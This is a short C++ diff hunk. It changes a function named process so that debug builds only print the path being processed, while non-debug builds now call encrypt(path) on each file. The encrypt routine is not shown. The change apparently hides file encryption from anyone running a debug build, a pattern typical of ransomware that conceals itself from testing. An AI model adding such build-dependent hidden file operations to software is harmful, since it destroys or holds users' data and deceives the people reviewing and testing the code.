@@ -122,7 +122,7 @@ void process(const path& path) {
 #ifdef DEBUG
 	cout << "Processing " << path << endl;
 #else
-
+	encrypt(path);
 #endif
 }
 
